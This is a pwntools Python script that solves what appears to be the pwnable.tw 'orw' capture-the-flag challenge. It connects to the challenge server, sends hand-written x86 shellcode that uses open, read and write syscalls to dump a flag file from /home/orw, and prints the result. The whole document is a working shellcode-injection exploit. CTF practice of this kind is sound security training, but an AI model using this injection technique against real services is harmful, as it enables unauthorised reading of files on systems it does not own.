from pwn import *

io = remote('chall.pwnable.tw', 10001)
io.recvuntil('Give my your shellcode:')

shellcode = asm('''
    xor ecx, ecx                
    push 0x0                    
    push 0x67616c66              
    push 0x2f77726f             
    push 0x2f656d6f             
    push 0x682f2f2f             
    mov ebx, esp                
    mov eax, 5                  
    int 0x80                    
    mov edx, 0x28               
    mov ecx, 0x0804a100         
    mov ebx, eax                
    mov eax, 3                  
    int 0x80                    
    mov edx, 0x28               
    mov ecx, 0x0804a100         
    mov ebx, 1                  
    mov eax, 4                  
    int 0x80                    
''')

io.send(shellcode)

flag = io.recvline()
print(flag.decode())

io.close()
